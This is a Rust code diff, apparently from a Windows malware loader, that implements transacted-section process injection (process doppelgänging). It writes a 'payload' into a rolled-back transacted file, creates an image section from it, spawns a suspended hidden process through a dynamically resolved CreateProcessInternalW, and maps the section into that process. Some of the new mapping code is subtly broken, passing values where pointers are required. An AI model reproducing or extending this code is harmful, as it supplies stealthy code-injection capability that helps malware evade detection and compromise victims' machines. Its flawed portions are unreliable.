@@ -2,32 +2,67 @@
 
 extern crate alloc;
 
-use core::mem::{transmute, zeroed};
+use core::ffi::c_void;
+use core::mem::zeroed;
 use core::ptr::null_mut;
-use ntapi::ntmmapi::NtCreateSection;
-use ntapi::winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};
+use ntapi::ntmmapi::{NtCreateSection, NtMapViewOfSection, ViewShare};
 use utils::WideString;
+use winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};
 use windows_sys::core::{PCWSTR, PWSTR};
-use windows_sys::Win32::Foundation::{CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, STATUS_SUCCESS};
+use windows_sys::Win32::Foundation::{CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS};
 use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateTransaction, RollbackTransaction, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL};
-use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 use windows_sys::Win32::System::Memory::{PAGE_READONLY, SECTION_ALL_ACCESS, SEC_IMAGE};
 use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW};
 
-type CreateProcessInternalWFn = unsafe extern "system" fn(
-    h_token: HANDLE,
-    application_name: PCWSTR,
-    command_line: PWSTR,
-    process_attributes: *mut SECURITY_ATTRIBUTES,
-    thread_attributes: *mut SECURITY_ATTRIBUTES,
-    inherit_handles: BOOL,
-    creation_flags: u32,
-    environment: HANDLE,
-    current_directory: PCWSTR,
-    startup_info: *mut STARTUPINFOW,
-    process_information: *mut PROCESS_INFORMATION,
-    p_handle: *mut HANDLE,
+macro_rules! module_function {
+    (
+        $module:expr,
+        $name:ident,
+        fn($($arg:ident : $arg_ty:ty),*) -> $ret:ty
+    ) => {
+        #[allow(non_snake_case)]
+        unsafe fn $name($($arg: $arg_ty),*) -> $ret {
+            use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+            use core::mem::transmute;
+
+            let h_module = unsafe {
+                GetModuleHandleA(concat!($module, "\0").as_bytes().as_ptr() as _)
+            };
+
+            if h_module.is_null() {
+                panic!("Couldn't get module handle for module {}", stringify!($module));
+            }
+
+            unsafe {
+                (transmute::<_, unsafe extern "system" fn($($arg_ty),*) -> $ret>(
+                    GetProcAddress(
+                        h_module,
+                        concat!(stringify!($name), "\0").as_bytes().as_ptr() as _,
+                    )
+                ))($($arg),*)
+            }
+        }
+    };
+}
+
+module_function!(
+    "kernel32.dll",
+    CreateProcessInternalW,
+    fn(
+        h_token: HANDLE,
+        application_name: PCWSTR,
+        command_line: PWSTR,
+        process_attributes: *mut SECURITY_ATTRIBUTES,
+        thread_attributes: *mut SECURITY_ATTRIBUTES,
+        inherit_handles: BOOL,
+        creation_flags: u32,
+        environment: HANDLE,
+        current_directory: PCWSTR,
+        startup_info: *mut STARTUPINFOW,
+        process_information: *mut PROCESS_INFORMATION,
+        p_handle: *mut HANDLE
+    ) -> BOOL
 );
 
 macro_rules! check {
@@ -36,30 +71,6 @@ macro_rules! check {
             return Err(INVALID_HANDLE_VALUE as _);
         }
     };
-}
-
-macro_rules! proc {
-    ($module:expr, $func:expr, $type:ty) => {{
-        use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-        use core::intrinsics::transmute;
-
-        let h_module = unsafe {
-            GetModuleHandleA(concat!($module, "\0").as_bytes().as_ptr() as _)
-        }
-
-        if h_module.is_null() {
-            panic!("Couldn't get module handle for module {}", stringify!($module));
-        }
-
-        unsafe {
-            transmute::<_, $type>(
-                GetProcAddress(
-                    h_module,
-                    concat!($func, "\0").as_bytes().as_ptr() as _,
-                )
-            )
-        }
-    }};
 }
 
 pub fn make_transacted_section<S>(dummy_name: S, payload: &[u8]) -> Result<HANDLE, i32>
@@ -134,7 +145,7 @@ where
 
     unsafe {
         CloseHandle(transacted_file)
-    }
+    };
 
     if unsafe {
         RollbackTransaction(transaction)
@@ -144,7 +155,7 @@ where
 
     unsafe {
         CloseHandle(transaction)
-    }
+    };
 
     Ok(section)
 }
@@ -165,25 +176,52 @@ where
 
     let token: HANDLE = null_mut();
     let mut new_token: HANDLE = null_mut();
-
-    let create_process_internal = proc!("kernel32", "CreateProcessInternalW", CreateProcessInternalWFn);
-
-    if !create_process_internal(
-        token,
-        null_mut(),
-        cmd_line.as_ptr() as _,
-        null_mut(),
-        null_mut(),
-        FALSE,
-        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
-        null_mut(),
-        start_dir.as_ptr() as _,
-        &mut si,
-        &mut pi,
-        &mut new_token,
-    ) {
+    if unsafe {
+        CreateProcessInternalW(
+            token,
+            null_mut(),
+            cmd_line.as_ptr() as _,
+            null_mut(),
+            null_mut(),
+            FALSE,
+            CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
+            null_mut(),
+            start_dir.as_ptr() as _,
+            &mut si,
+            &mut pi,
+            &mut new_token,
+        )
+    } == FALSE {
         return None;
     }
 
     Some(pi)
+}
+
+pub fn map_buffer_into_process(process: HANDLE, section: HANDLE) -> Option<HANDLE> {
+    let view_size = 0usize;
+    let section_base_address: *mut c_void = null_mut();
+
+    let status = unsafe {
+        NtMapViewOfSection(
+            section as *mut _ as _,
+            process as *mut _ as _,
+            section_base_address as _,
+            0,
+            0,
+            null_mut(),
+            view_size as _,
+            ViewShare,
+            0,
+            PAGE_READONLY
+        )
+    };
+
+    if status != STATUS_SUCCESS {
+        if status != STATUS_IMAGE_NOT_AT_BASE {
+            return None;
+        }
+    }
+
+    Some(section_base_address)
 }
